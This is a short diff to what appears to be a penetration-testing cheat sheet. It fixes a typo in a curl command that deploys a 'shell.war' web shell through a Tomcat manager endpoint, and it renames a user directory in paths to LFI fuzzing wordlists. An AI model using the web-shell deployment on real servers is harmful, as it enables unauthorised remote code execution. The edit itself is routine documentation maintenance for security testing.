@@ -54,7 +54,7 @@
 
 #### Uploading to Tomcat7 and Above
 
-<code>curl -v -u [USER]:[PASSWORD]] -T shell.war 'http://[IP]:8080/manager/text/deploy?path=/shellh&update=true'</code>
+<code>curl -v -u [USER]:[PASSWORD] -T shell.war 'http://[IP]:8080/manager/text/deploy?path=/shellh&update=true'</code>
 
 ### Local File Inclusion / Remote File Inclusion (LFI / RFI)
 
@@ -62,11 +62,11 @@
 
 #### LFI Lists
 
-Linux: <code>/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt</code>
+Linux: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt</code>
 
-Windows: <code>/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt</code>
+Windows: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt</code>
 
-Both: <code>/home/liodeus/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt</code>
+Both: <code>/home/pharo/wordlist/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt</code>
 
 ## FTP 
 
